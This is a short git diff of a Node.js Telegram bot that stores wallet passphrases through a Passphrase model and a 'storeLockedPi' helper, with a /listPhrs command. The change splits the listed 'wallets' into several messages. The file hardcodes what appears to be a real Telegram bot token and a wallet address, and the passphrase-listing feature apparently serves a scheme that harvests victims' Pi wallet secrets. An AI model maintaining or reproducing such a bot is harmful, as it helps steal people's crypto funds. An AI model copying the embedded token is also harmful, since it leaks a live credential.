@@ -4,7 +4,7 @@ import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
 import { connectToDB } from "./db.js";
 import Sponsors from "./models/Sponsors.js";
 import Passphrase from "./models/Passphrase.js";
-import { formatReadableTimeString, timeAgoOrInString } from "./utils/helper.js";
+import { formatReadableTimeString, splitMessage, timeAgoOrInString } from "./utils/helper.js";
 
 const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
@@ -152,10 +152,14 @@ bot.onText(/\/listPhrs/, async (msg) => {
 
     const message = cleanList.join('\n');
 
+    const chunks = splitMessage(message);
+
+    for (const chunk of chunks) {
+        bot.sendMessage(chatId, `📋 *List of Wallets:*\n\n${chunk}`, {
+            parse_mode: 'Markdown',
+        });
+    }
     
-    bot.sendMessage(chatId, `📋 *List of Wallets:*\n\n${message}`, {
-      parse_mode: 'Markdown',
-    });
 
   } catch (err) {
     console.error('Error fetching wallets:', err);
